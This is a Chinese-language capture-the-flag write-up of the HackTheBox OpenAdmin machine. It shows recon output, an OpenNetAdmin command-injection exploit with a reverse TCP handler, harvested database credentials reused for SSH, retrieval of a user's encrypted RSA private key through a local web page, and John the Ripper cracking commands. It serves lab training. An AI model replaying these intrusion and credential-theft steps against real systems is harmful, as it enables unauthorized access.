---
title: "HackTheBox：OpenAdmin笔记"
slug: de9d6z
date: 2020-04-20T15:51:26+08:00
source: yuque/penetration
---

# 信息收集
10.10.10.171

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1587380704833-408753ae-e384-41be-80ab-7aa9c04e58a4.png)

## Nmap
```sql
# nmap -A 10.10.10.171 -oA nmap.tcp
Nmap scan report for 10.10.10.171
Host is up (0.34s latency).
Not shown: 993 closed ports
PORT      STATE    SERVICE        VERSION
22/tcp    open     ssh            OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp    open     http           Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
1185/tcp  filtered catchpole
2046/tcp  filtered sdfunc
2701/tcp  filtered sms-rcinfo
2875/tcp  filtered dxmessagebase2
24444/tcp filtered unknown
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.16 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Android 4.1.1 (93%), Linux 3.2 - 4.9 (93%), Android 4.2.2 (Linux 3.4) (93%), Linux 3.10 (92%), Android 4.1.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   354.54 ms 10.10.14.1
2   354.49 ms 10.10.10.171

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 
```

## 80端口：enum more -> OpenNetAdmin


```sql
# dirb http://10.10.10.171/ -o dirb.scan
---- Scanning URL: http://10.10.10.171/ ----
==> DIRECTORY: http://10.10.10.171/artwork/                                                                          
	+ http://10.10.10.171/index.html (CODE:200|SIZE:10918)                                                               
==> DIRECTORY: http://10.10.10.171/music/                                                                            
	+ http://10.10.10.171/server-status (CODE:403|SIZE:277)                                                              
                                                                                                                     
---- Entering directory: http://10.10.10.171/artwork/ ----
==> DIRECTORY: http://10.10.10.171/artwork/css/                                                                      
==> DIRECTORY: http://10.10.10.171/artwork/fonts/  
```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1587375922870-360a8238-3f29-405c-90b5-2f5f10ada95c.png)

找了一圈，无任何有价值东西。扫目录又发现一个`/music`目录

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1587375957425-dcf2a709-2d6e-4a4a-ab94-51b9a07d2b3f.png)

`[http://10.10.10.171/ona/](http://10.10.10.171/ona/)`找到一个好东西`OpenNetAdmin 18.1.1`

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1587377149318-c776ea73-7777-4841-82e6-2a024507a64c.png)

一通搜索，`msf`发现`rce`模块，不知为啥失败了

```plain
msf5 > use unix/webapp/opennetadmin_ping_cmd_injection
...
msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > run

[*] Started reverse TCP handler on 10.10.14.14:4444 
[*] Exploiting...
[*] Command Stager progress - 100.00% done (703/703 bytes)
[*] Exploit completed, but no session was created.
```

又找到一个exp脚本[https://github.com/amriunix/ona-rce](https://github.com/amriunix/ona-rce)，跑成功了，`www-data`权限，但是无权读`flag`

```plain
sh$ ls /home/
jimmy
joanna
sh$ ls /home/jimmy
ls: cannot open directory '/home/jimmy': Permission denied
sh$ ls /home/joanna
ls: cannot open directory '/home/joanna': Permission denied
```

# 提权
发现两个用户`jimmy`  、 `joanna`

```sql
Linux openadmin 4.15.0-70-generic #79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
Ubuntu 18.04.3 LTS \n \l
```

收集到一些密码

```sql
# /var/www/html/ona/local/config/database_settings.inc.php
<?php
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1587382212524-e8e157ab-26e8-4953-acb9-b763fcdddf52.png)



```sql
/var/www/html/sierra/contact_process.php
    $to = "rockybd1995@gmail.com";
    ...
       $send = mail($to, $subject, $body, $headers);

```

用数据库密码，`ssh`登录上了`jimmy`的帐号

## jimmy用户
读文件，发现`/var/www/internal`下面的文件。这个文件夹在`www-data`权限下是读不到的

```sql
jimmy@openadmin:/var/www/internal$ ls
index.php  logout.php  main.php

jimmy@openadmin:/var/www/internal$ cat main.php 
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>...

jimmy@openadmin:/var/www/internal$ cat index.php
if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && 
		hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1')

```

`sha512`解密:`Revealed`

那怎么利用这个`main.php` 中的`shell exec`呢。`main.php`需要我们登录，我这里原本打算采用更改`session`文件来实现登录态，谁知没权限。。只好找其他方法

```sql
jimmy@openadmin:/etc/php/7.2/cli$ cat php.ini |grep session.save_path
;session.save_path = "/var/lib/php/sessions"

```

注意到52846端口，看不到进程的细节，应该是跑了个高权限的程序

```sql
jimmy@openadmin:/var/www/internal$ lsof -i:52846
jimmy@openadmin:/var/www/internal$  netstat -tunlp 
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                 
```

```sql
jimmy@openadmin:/var/www/internal$ curl 127.0.0.1:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>

```

**得到了****joanna的**私钥，准备用johntheripper爆破

```sql
python /usr/share/john/ssh2john.py id_rsa > sshjohn
john --wordlist=/usr/share/wordlists/rockyou.txt sshjohn 
```

不过一开始遇到了问题，`rockyou.txt`没解压好。用下面的方法解决

```sql
在Kali上，使用以下命令解压缩rocyou.txt.gz文件：

sudo gunzip /usr/share/wordlists.gz
wc -l /usr/share/wordlists/rockyou.txt
```

``

ref:[https://blog.csdn.net/sdihvai/article/details/103953010#jimmy_27](https://blog.csdn.net/sdihvai/article/details/103953010#jimmy_27)

